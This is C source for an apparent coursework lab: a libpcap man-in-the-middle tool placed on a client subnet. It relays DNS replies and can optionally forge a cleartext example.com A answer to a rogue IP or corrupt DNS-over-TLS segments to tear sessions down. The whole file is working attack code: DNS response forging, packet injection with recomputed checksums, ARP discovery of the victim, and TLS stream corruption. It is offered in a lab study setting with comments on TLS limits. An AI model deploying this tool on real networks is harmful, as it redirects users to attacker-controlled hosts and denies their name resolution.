/*
 * CS6008 Assignment 2 — Phase 7: last-mile man-in-the-middle (C/libpcap).
 * ---------------------------------------------------------------------
 * On-path tool on the client subnet. The edge-router diverts resolver->client
 * replies here. It relays ALL of them transparently by rewriting only the
 * Ethernet addresses (which leaves the IP/UDP/TCP checksums valid), so an
 * encrypted DoT/DoH session passes through untouched — UNLESS an attack flag is
 * given:
 *
 *   --forge-cleartext : rewrite the CLEARTEXT (UDP/53) example.com/A answer to
 *                       rogue-web. This only bites a client that falls back to
 *                       cleartext; a TLS answer is encrypted and cannot be read
 *                       or rewritten.
 *   --break-dot       : corrupt one payload byte of each DoT segment (TCP src
 *                       port 853). TLS integrity then fails and the session is
 *                       torn down — the answer cannot be ALTERED, only denied.
 *
 * With no flag it is a pure transparent relay (useful to confirm the diversion
 * itself is harmless to TLS). Client MAC discovered by ARP; nothing hard-coded.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <netpacket/packet.h>

#define MAX_PKT 2048
#define TARGET "example.com"
#define CLIENT_IP "172.16.1.10"
#define ROGUE_IP  "172.16.1.30"
#define T_A 1

static pcap_t *handle = NULL;
static char g_dev[64] = "eth0";
static uint8_t g_amac[6], g_cmac[6];
static uint32_t g_aip_n, g_cip_n, g_rogue_n;
static int g_forge = 0, g_break = 0;
static volatile sig_atomic_t run = 1;
static void on_sig(int s){ (void)s; run = 0; if (handle) pcap_breakloop(handle); }

static uint16_t checksum(const void *buf, size_t len){
    uint32_t sum=0; const uint16_t *p=buf;
    while(len>1){sum+=*p++;len-=2;}
    if(len==1) sum+=*(const uint8_t*)p;
    while(sum>>16) sum=(sum&0xFFFF)+(sum>>16);
    return (uint16_t)(~sum);
}
struct pseudo_hdr{uint32_t s,d;uint8_t z,p;uint16_t l;}__attribute__((packed));
static uint16_t l4_checksum(const struct iphdr*ip,uint8_t proto,const uint8_t*l4,size_t l4len){
    struct pseudo_hdr ph={ip->saddr,ip->daddr,0,proto,htons((uint16_t)l4len)};
    size_t tot=sizeof(ph)+l4len;
    uint8_t*b=calloc(1,tot+1); if(!b) return 0;
    memcpy(b,&ph,sizeof(ph)); memcpy(b+sizeof(ph),l4,l4len);
    uint16_t r=checksum(b,tot); free(b);
    if(proto==IPPROTO_UDP && r==0) return 0xFFFF;
    return r;
}
static int read_name(const uint8_t*m,size_t ml,size_t off,char*out,size_t os){
    size_t o=0,i=off; int jumped=0,after=-1,guard=0;
    if(out&&os) out[0]='\0';
    while(i<ml){
        if(++guard>128) return -1;
        uint8_t l=m[i];
        if((l&0xC0)==0xC0){ if(i+1>=ml) return -1; if(!jumped) after=(int)(i+2);
            i=((l&0x3F)<<8)|m[i+1]; jumped=1; if(i>=ml) return -1; continue; }
        if(l==0){ if(!jumped) after=(int)(i+1); break; }
        if(l>63||i+1+l>ml) return -1;
        i++;
        for(uint8_t k=0;k<l;k++){ if(out&&o+2<os){ char c=(char)m[i+k]; if(c>='A'&&c<='Z') c=(char)(c-'A'+'a'); out[o++]=c; } }
        if(out&&o+1<os) out[o++]='.';
        i+=l;
    }
    if(out&&os){ if(o&&out[o-1]=='.') o--; out[o]='\0'; }
    return after;
}
static int forge_a(const uint8_t*dns,size_t dlen,uint8_t*out){
    if(dlen<12) return -1;
    int e=read_name(dns,dlen,12,NULL,0); if(e<0) return -1;
    size_t qend=(size_t)e+4; if(qend>dlen) return -1;
    out[0]=dns[0]; out[1]=dns[1];
    out[2]=0x81; out[3]=0xA0;      /* QR RD RA AD */
    out[4]=dns[4]; out[5]=dns[5];
    out[6]=0; out[7]=1; out[8]=0; out[9]=0; out[10]=0; out[11]=0;
    size_t ql=qend-12; memcpy(out+12,dns+12,ql); size_t c=12+ql;
    out[c++]=0xC0; out[c++]=0x0C; out[c++]=0; out[c++]=T_A; out[c++]=0; out[c++]=1;
    out[c++]=0; out[c++]=0; out[c++]=0x01; out[c++]=0x2C; out[c++]=0; out[c++]=4;
    memcpy(out+c,&g_rogue_n,4); c+=4;
    return (int)c;
}

/* Relay a frame to the client: rewrite MACs AND recompute IP/L4 checksums.
 *
 * The captured bytes cannot be trusted to already carry a valid TCP/UDP
 * checksum: on a veth pair with checksum offload (the normal case on Linux /
 * Docker bridges), the kernel marks the outgoing skb CHECKSUM_PARTIAL and
 * leaves the real checksum to be filled in by the NIC/offload layer at
 * actual transmission time. A raw AF_PACKET capture via libpcap sees the skb
 * BEFORE that happens, so the checksum field it captures can be incomplete.
 * Re-injecting those exact bytes on a different interface then produces a
 * frame the receiving kernel silently drops at the TCP/UDP layer -- it is
 * received cleanly at L2 (so link-level RX counters look fine) but never
 * reaches the application, which looks exactly like "the relay isn't
 * working" from the outside. Every other relay path in this program (and in
 * the sibling interceptors) already recomputes checksums after editing a
 * packet; this makes the "untouched" relay path do the same, since it is no
 * longer literally the original frame once the Ethernet header changes. */
static void relay_macs(const u_char*pkt,size_t caplen){
    uint8_t buf[MAX_PKT]; if(caplen>sizeof(buf)) return;
    memcpy(buf,pkt,caplen);
    struct ether_header*eth=(struct ether_header*)buf;
    memcpy(eth->ether_shost,g_amac,6); memcpy(eth->ether_dhost,g_cmac,6);

    if(ntohs(eth->ether_type)==ETHERTYPE_IP &&
       caplen>=sizeof(struct ether_header)+sizeof(struct iphdr)){
        struct iphdr*ip=(struct iphdr*)(buf+sizeof(struct ether_header));
        size_t ihl=ip->ihl*4;
        size_t ip_total=ntohs(ip->tot_len);
        if(ihl>=sizeof(struct iphdr) && ip_total>=ihl &&
           sizeof(struct ether_header)+ip_total<=caplen){
            ip->check=0; ip->check=checksum(ip,ihl);
            uint8_t*l4=(uint8_t*)ip+ihl;
            size_t l4len=ip_total-ihl;
            if(ip->protocol==IPPROTO_TCP && l4len>=sizeof(struct tcphdr)){
                struct tcphdr*th=(struct tcphdr*)l4;
                th->check=0; th->check=l4_checksum(ip,IPPROTO_TCP,l4,l4len);
            } else if(ip->protocol==IPPROTO_UDP && l4len>=sizeof(struct udphdr)){
                struct udphdr*uh=(struct udphdr*)l4;
                uh->check=0; uh->check=l4_checksum(ip,IPPROTO_UDP,l4,l4len);
            }
        }
    }

    pcap_sendpacket(handle,buf,caplen);
}

static void handler(u_char*u,const struct pcap_pkthdr*h,const u_char*pkt){
    (void)u;
    size_t base=sizeof(struct ether_header)+sizeof(struct iphdr);
    if(h->caplen<base) return;
    struct ether_header*eth=(struct ether_header*)pkt;
    if(ntohs(eth->ether_type)!=ETHERTYPE_IP) return;
    if(memcmp(eth->ether_shost,g_amac,6)==0) return;
    struct iphdr*ip=(struct iphdr*)(pkt+sizeof(struct ether_header));
    if(ip->daddr!=g_cip_n) return;
    size_t ihl=ip->ihl*4;

    /* ---- UDP/53 cleartext: optionally forge example.com/A ---- */
    if(ip->protocol==IPPROTO_UDP && g_forge){
        struct udphdr*udp=(struct udphdr*)((uint8_t*)ip+ihl);
        if(ntohs(udp->source)==53){
            const uint8_t*dns=(const uint8_t*)udp+sizeof(struct udphdr);
            size_t ulen=ntohs(udp->len);
            if(ulen>=sizeof(struct udphdr)+12 && (const u_char*)dns+ (ulen-sizeof(struct udphdr)) <= pkt+h->caplen){
                size_t dlen=ulen-sizeof(struct udphdr);
                uint16_t flags=(dns[2]<<8)|dns[3]; uint16_t qd=(dns[4]<<8)|dns[5]; uint16_t an=(dns[6]<<8)|dns[7];
                char qn[256]={0}; uint16_t qt=0;
                if(qd){ int e=read_name(dns,dlen,12,qn,sizeof(qn)); if(e>=0&&(size_t)e+4<=dlen) qt=(dns[e]<<8)|dns[e+1]; }
                if((flags&0x8000) && an>=1 && qt==T_A && strcasecmp(qn,TARGET)==0){
                    uint8_t fdns[512]; int fl=forge_a(dns,dlen,fdns);
                    if(fl>0){
                        uint8_t fr[MAX_PKT];
                        size_t l2=sizeof(struct ether_header),l3=sizeof(struct iphdr),l4=sizeof(struct udphdr);
                        struct ether_header*fe=(struct ether_header*)fr;
                        memcpy(fe->ether_shost,g_amac,6); memcpy(fe->ether_dhost,g_cmac,6); fe->ether_type=htons(ETHERTYPE_IP);
                        struct iphdr*oi=(struct iphdr*)(fr+l2); *oi=*ip; oi->ihl=5; oi->tot_len=htons((uint16_t)(l3+l4+fl));
                        oi->check=0; oi->check=checksum(oi,l3);
                        struct udphdr*ou=(struct udphdr*)(fr+l2+l3);
                        ou->source=udp->source; ou->dest=udp->dest; ou->len=htons((uint16_t)(l4+fl));
                        memcpy(fr+l2+l3+l4,fdns,fl);
                        ou->check=0; ou->check=l4_checksum(oi,IPPROTO_UDP,(uint8_t*)ou,l4+fl);
                        printf("[FORGE] cleartext example.com A -> %s (AD set)\n",ROGUE_IP); fflush(stdout);
                        pcap_sendpacket(handle,fr,l2+l3+l4+fl);
                        return;
                    }
                }
            }
        }
        relay_macs(pkt,h->caplen); return;
    }

        /* ---- TCP/853 DoT: optionally corrupt (breaks TLS, cannot forge) ---- */
    if(ip->protocol==IPPROTO_TCP && g_break){
        struct tcphdr*th=(struct tcphdr*)((uint8_t*)ip+ihl);
        if(ntohs(th->source)==853){
            uint8_t buf[MAX_PKT]; if(h->caplen>sizeof(buf)){ relay_macs(pkt,h->caplen); return; }
            memcpy(buf,pkt,h->caplen);
            struct ether_header*be=(struct ether_header*)buf;
            memcpy(be->ether_shost,g_amac,6); memcpy(be->ether_dhost,g_cmac,6);
            struct iphdr*bi=(struct iphdr*)(buf+sizeof(struct ether_header));
            size_t iptot=ntohs(bi->tot_len);
            uint8_t*tcp=(uint8_t*)bi+ihl; size_t tcplen=iptot-ihl;
                        struct tcphdr*bth=(struct tcphdr*)tcp; size_t doff=bth->doff*4;
            if(tcplen>doff){
                /* TLS record content-type byte: 0x16 handshake, 0x17
                 * application data, 0x15 alert. Skip the one unencrypted
                 * handshake flight (ClientHello/ServerHello, visible as
                 * 0x16) so corruption lands after the TLS session has at
                 * least begun, not on the very first plaintext message.
                 *
                 * HONEST LIMITATION: under TLS 1.3 every record emitted
                 * after ServerHello -- the remainder of the handshake
                 * (EncryptedExtensions/Certificate/Finished) as well as
                 * genuine post-handshake application data -- is wrapped at
                 * the outer record layer as type 0x17, by design (TLS 1.3's
                 * record-type obfuscation). A single captured byte cannot
                 * distinguish "still finishing the handshake" from "an
                 * established session's DNS answer" at that point; doing so
                 * would need per-connection TCP sequence/flow tracking
                 * against a small TLS state machine, which this tool does
                 * not implement. This check therefore narrows corruption to
                 * "after the initial plaintext flight", not to "only an
                 * established session's application data" -- report the
                 * result as DoT-stream/session corruption, not as a proven
                 * alteration of an already-established answer. */
                uint8_t content_type = tcp[doff];
                if(content_type != 0x16){
                    tcp[tcplen-1]^=0xFF;
                    printf("[BREAK-DoT] corrupted %zu-byte TLS record (content-type 0x%02x) -> TLS will reject\n",tcplen-doff,content_type); fflush(stdout);
                } else {
                    printf("[BREAK-DoT] leaving initial handshake record (content-type 0x16) untouched\n"); fflush(stdout);
                }
            }
            /* Recompute IP + TCP checksums on EVERY relayed segment here, not
             * just the ones actually corrupted above -- same reasoning as
             * relay_macs(): the captured checksum cannot be trusted as-is
             * under NIC/veth checksum offload, so bare SYN-ACKs/ACKs that
             * pass through this branch untouched also need their checksums
             * recomputed, or they get silently dropped by the client's
             * kernel before the handshake ever reaches TLS at all. */
            bi->check=0; bi->check=checksum(bi,ihl);
            bth->check=0; bth->check=l4_checksum(bi,IPPROTO_TCP,tcp,tcplen);
            pcap_sendpacket(handle,buf,h->caplen); return;
        }
    }

    static unsigned long relay_count = 0;
    relay_macs(pkt,h->caplen);
    if (++relay_count % 10 == 1) {  /* log every 10th to avoid flooding */
        printf("[RELAY] passed through %lu packet(s) so far (last: proto=%d)\n",
               relay_count, ip->protocol);
        fflush(stdout);
    }
}

struct arp_pkt{struct ether_header eth;uint16_t ht,pt;uint8_t hl,pl;uint16_t op;uint8_t sha[6],spa[4],tha[6],tpa[4];}__attribute__((packed));
static int arp_resolve(uint32_t target,uint8_t*out){
    for(int a=0;a<20&&run;a++){
        struct arp_pkt q; memset(&q,0,sizeof(q));
        memset(q.eth.ether_dhost,0xFF,6); memcpy(q.eth.ether_shost,g_amac,6);
        q.eth.ether_type=htons(ETHERTYPE_ARP);
        q.ht=htons(ARPHRD_ETHER);q.pt=htons(ETHERTYPE_IP);q.hl=6;q.pl=4;q.op=htons(ARPOP_REQUEST);
        memcpy(q.sha,g_amac,6);memcpy(q.spa,&g_aip_n,4);memcpy(q.tpa,&target,4);
        pcap_sendpacket(handle,(const u_char*)&q,sizeof(q));
        time_t s=time(NULL);
        while(time(NULL)-s<1&&run){
            struct pcap_pkthdr*h;const u_char*p;
            if(pcap_next_ex(handle,&h,&p)!=1) continue;
            if(h->caplen<sizeof(struct arp_pkt)) continue;
            const struct arp_pkt*r=(const struct arp_pkt*)p;
            if(ntohs(r->eth.ether_type)!=ETHERTYPE_ARP) continue;
            if(ntohs(r->op)!=ARPOP_REPLY) continue;
            if(memcmp(r->spa,&target,4)!=0) continue;
            memcpy(out,r->sha,6); return 0;
        }
    }
    return -1;
}
static int load_local(void){
    struct ifaddrs*ifap,*ifa; int ip=0,mac=0;
    if(getifaddrs(&ifap)) return -1;
    for(ifa=ifap;ifa;ifa=ifa->ifa_next){
        if(!ifa->ifa_addr||strcmp(ifa->ifa_name,g_dev)) continue;
        if(ifa->ifa_addr->sa_family==AF_INET) g_aip_n=((struct sockaddr_in*)ifa->ifa_addr)->sin_addr.s_addr,ip=1;
        else if(ifa->ifa_addr->sa_family==AF_PACKET){ struct sockaddr_ll*ll=(struct sockaddr_ll*)ifa->ifa_addr; if(ll->sll_halen==6){memcpy(g_amac,ll->sll_addr,6);mac=1;} }
    }
    freeifaddrs(ifap);
    return (ip&&mac)?0:-1;
}

int main(int argc,char**argv){
    for(int i=1;i<argc;i++){
        if(!strcmp(argv[i],"--forge-cleartext")) g_forge=1;
        else if(!strcmp(argv[i],"--break-dot")) g_break=1;
        else if(!strcmp(argv[i],"-i")&&i+1<argc) strncpy(g_dev,argv[++i],sizeof(g_dev)-1);
    }
    inet_pton(AF_INET,CLIENT_IP,&g_cip_n);
    inet_pton(AF_INET,ROGUE_IP,&g_rogue_n);
    if(load_local()){ fprintf(stderr,"cannot read %s addr/mac\n",g_dev); return 1; }
    signal(SIGINT,on_sig); signal(SIGTERM,on_sig);
    char eb[PCAP_ERRBUF_SIZE];
    handle=pcap_open_live(g_dev,MAX_PKT,1,10,eb);
    if(!handle){ fprintf(stderr,"pcap_open_live: %s\n",eb); return 1; }
    if(arp_resolve(g_cip_n,g_cmac)){ fprintf(stderr,"ARP of %s failed; is the route diverted?\n",CLIENT_IP); return 1; }
    printf("mitm: dev=%s forge-cleartext=%d break-dot=%d client at %02x:%02x:%02x:%02x:%02x:%02x\n",
           g_dev,g_forge,g_break,g_cmac[0],g_cmac[1],g_cmac[2],g_cmac[3],g_cmac[4],g_cmac[5]);
    fflush(stdout);
    struct bpf_program fp;
    if(pcap_compile(handle,&fp,"ip and dst host " CLIENT_IP,1,PCAP_NETMASK_UNKNOWN)==-1){
        fprintf(stderr,"bpf: %s\n",pcap_geterr(handle)); return 1;
    }
    pcap_setfilter(handle,&fp);
    printf("mitm: running\n"); fflush(stdout);
    pcap_loop(handle,-1,handler,NULL);
    pcap_freecode(&fp); pcap_close(handle);
    return 0;
}
